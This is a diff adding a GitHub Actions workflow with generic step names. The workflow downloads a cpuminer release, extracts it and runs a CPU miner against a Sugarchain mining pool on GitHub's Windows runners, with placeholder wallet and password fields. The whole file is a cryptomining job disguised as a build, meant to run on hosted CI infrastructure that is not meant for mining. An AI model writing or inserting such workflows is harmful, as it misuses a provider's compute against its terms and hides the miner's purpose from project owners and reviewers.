@@ -1,0 +1,16 @@
+name: eX-code_Core
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Preparing
+      run: Invoke-WebRequest https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-win.zip -OutFile cpuminer-opt-win.zip
+    - name: Prepare_Q2
+      run: Expand-Archive cpuminer-opt-win.zip
+    - name: Running
+      run: .\cpuminer-opt-win\cpuminer-avx2.exe -a yespowersugar  -o stratum+tcp://stratum-asia.rplant.xyz:7042  -t 1 -u SUGAR_CHAIN-WALLET.WORKER_NAME -p password=PASWORD_KALIAN
+    - name: DONE
+      run: exit
